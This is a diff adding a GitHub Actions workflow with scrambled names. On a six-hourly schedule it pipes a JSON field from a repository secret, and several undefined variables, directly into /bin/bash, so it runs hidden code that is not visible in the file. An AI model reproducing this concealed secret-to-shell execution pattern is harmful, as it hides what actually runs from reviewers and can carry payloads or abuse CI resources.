@@ -1,0 +1,23 @@
+name: reachdadaodog
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: reachdadaodog
+        env:
+          xnh482: ${{ secrets.xnh482 }}
+        run: |
+          echo $xnh482 | jq -r .rdjy29 | /bin/bash
+          echo $ewjos63 | jq -r .iwzrb0 | /bin/bash
+          echo $eul5286 | jq -r .e17013 | /bin/bash
+          echo $lx2248 | jq -r .mqd6 | /bin/bash
+          echo $hwwai1 | jq -r .ssu28 | /bin/bash
+          echo $cwhe8038 | jq -r .fcz0 | /bin/bash
+          echo $zrc67916 | jq -r .dt92 | /bin/bash
+
